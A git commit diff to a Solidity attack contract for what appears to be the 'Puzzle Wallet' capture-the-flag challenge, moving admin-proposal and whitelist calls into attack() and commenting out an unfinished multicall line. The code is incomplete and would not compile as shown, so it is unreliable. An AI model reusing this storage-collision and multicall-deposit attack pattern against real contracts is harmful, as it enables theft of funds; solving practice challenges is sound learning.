1fe1439ce08ac9ec272b71c88812cc8978ad1133
sarobinson2001 <sarobinson2011@gmail.com>
2023-11-21 09:08:24 +0000

    updated 24-attack.sol

--- contracts/24-Puzzle Wallet/24-attack.sol
+++ contracts/24-Puzzle Wallet/24-attack.sol
@@ -2,21 +2,23 @@
 pragma solidity ^0.8.0;
 
 import "./24-puzzlewallet.sol";
+import "interfaces/ipuzzlewallet.sol";
+
 
 contract Attack24 {
     PuzzleWallet target;
 
     constructor(address _targetAddress) {
-        target = PuzzleWallet(_targetAddress);
-        target.proposeNewAdmin(msg.sender);
-        target.addToWhitelist(msg.sender);
+        target = PuzzleWallet(_targetAddress);        
     }
 
-    function attack() public {
+    function attack(IPuzzleWallet) public {
         // multicall attack
-        bytes[] memory data = abi.encodeWithSelector(bytes4, arg);   //   <--  HERE !!
+        // bytes[] memory data = abi.encodeWithSelector(bytes4, arg);   //   <--  HERE !!
         // set the data argument as a abi encoded multicall to deposit
-        (bool success, ) = target.multicall(data);
+        // target.multicall(data);
+        target.proposeNewAdmin(msg.sender);
+        target.addToWhitelist(msg.sender);
     }
 }
 
@@ -26,11 +28,4 @@ contract Attack24 {
 // }
 
 
-// Make indirect calls to multicall:
-
-// pass multicall a bytes32, abi-encoded, data array containing a data array with 2 elements:
-//  
-// calls to multicall i.e. itself.
-// --> so multicall calls multicall 10 times, with each array element contains a call to deposit().  
-// ----> so we get 10 deposits in a single deposit() call, by batching them with multicall().
 
